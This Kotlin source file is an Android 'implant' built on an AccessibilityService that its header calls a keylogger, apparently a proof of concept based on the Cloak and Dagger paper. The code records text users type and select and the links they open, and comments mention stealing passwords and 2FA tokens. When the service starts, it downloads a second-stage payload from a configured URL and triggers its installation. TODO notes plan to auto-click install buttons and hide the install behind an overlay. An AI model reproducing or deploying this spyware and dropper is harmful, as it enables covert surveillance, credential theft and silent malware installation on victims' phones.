/*
* Uses an AccessibilityService as a keylogger.
* Based on Cloak and Dagger: From Two Permissions to Complete Control of the UI Feedback Loop by
* Yanick Fratantonio, Chenxiong Qian, Simon P. Chung, Wenke Lee. 
* 
* Although this cannot see passwords from EditText due to Android's restrictions, we can see text
* the user selects, browser history and non-password text they enter.
* */
package com.cooperthecoder.implant

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Service
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.support.v4.content.FileProvider
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.io.File

class LoggingAccessibilityService : AccessibilityService(), PluginCallback {

    companion object {
        @JvmStatic
        private val TAG: String = LoggingAccessibilityService::class.java.name
    }

    lateinit var pluginManager: PluginManager

    override fun onInterrupt() {
    }

    override fun onCreate() {
        pluginManager = PluginManager(this)
        pluginManager.download(Config.SECOND_STAGE_PAYLOAD_URL)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // TODO: Listen for events from the PackageManager and click the install buttons using the accessibility service
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // This event type is fired when text is entered in any EditText that is not a
                // password.
                for (string in event.strings()) {
                    logEvent(event, "Captured from EditText: $string")
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // This event type includes clicked links, as well as selected text.
                // We can record their browsing history as well as steal passwords and 2FA tokens
                // that are selected.
                for (string in event.selected()) {
                    logEvent(event, "Text selected: $string")
                }
                for (uri in event.uris()) {
                    logEvent(event, "URI detected: $uri")
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo()
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        serviceInfo = info
    }

    override fun onPluginDownloaded(file: File) {
        Log.d(TAG, "Plugin download completed successfully.")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val fileUri = FileProvider.getUriForFile(this, Config.FILE_PROVIDER_NAME, file)
            val intent = Intent(Intent.ACTION_INSTALL_PACKAGE)
            intent.data = fileUri
            intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
            startActivity(intent)
        } else {
            val intent = Intent(Intent.ACTION_VIEW)
            val fileUri = Uri.fromFile(file)
            intent.setDataAndType(fileUri, Config.APK_CONTENT_TYPE)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }
        // TODO: Start an overlay to hide the fact that we're installing an app.
    }

    override fun onDownloadFailed(cause: Throwable) {
        cause.printStackTrace()
    }

    override fun onDestroy() {
        super.onDestroy()
        pluginManager.onDestroy()
    }


    private fun logEvent(event: AccessibilityEvent, message: String) {
        Log.d(TAG + " - " + event.packageName, message)
    }
}